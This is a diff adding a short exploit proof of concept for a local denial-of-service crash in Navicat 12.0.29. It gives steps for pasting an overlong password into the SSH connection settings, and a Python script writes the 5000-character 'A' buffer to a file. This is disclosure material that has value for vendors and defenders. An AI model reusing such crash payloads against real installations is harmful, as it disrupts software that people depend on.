@@ -1,0 +1,25 @@
+# Exploit Title: Navicat 12.0.29 - 'SSH' Denial of Service (PoC)
+# Author: Rafael Alfaro
+# Discovery Date: 2018-10-27
+# Vendor Homepage: https://www.navicat.com/es/
+# Software Link : https://www.navicat.com/es/download/navicat-premium
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on OS: Windows 7 x64 en, Windows 10 Home x64 es
+
+# Steps to Produce the Crash:
+# 1.- Run python code : python Navicat-SSH.py
+# 2.- Open navicat.txt and copy content to clipboard
+# 3.- Open navicat.exe
+# 4.- Click "Conexion" and select "MySQL..."
+# 5.- In the "General" tab, give a name to the connection in "Nombre de Conexion" (i. e. conexion1).
+# 6.- In the "SSH" tab check "Uso de tunel SSH", then set and IP address to the "Host" textbox (i. e. 127.0.0.1) and write down a username in "Nombre de usuario" (i. e. admin).
+# 7.- Be sure that "Metodo de autentificacion" is set to "Contrasena" and finally paste Clipboard in "Contrasena".
+# 8.- Click "Aceptar".
+# 9.- Crashed!
+
+# !/usr/bin/env python Navicat-SSH.py
+
+buffer = "\x41" * 5000
+f = open("navicat.txt", "w")
+f.write(buffer)
+f.close()
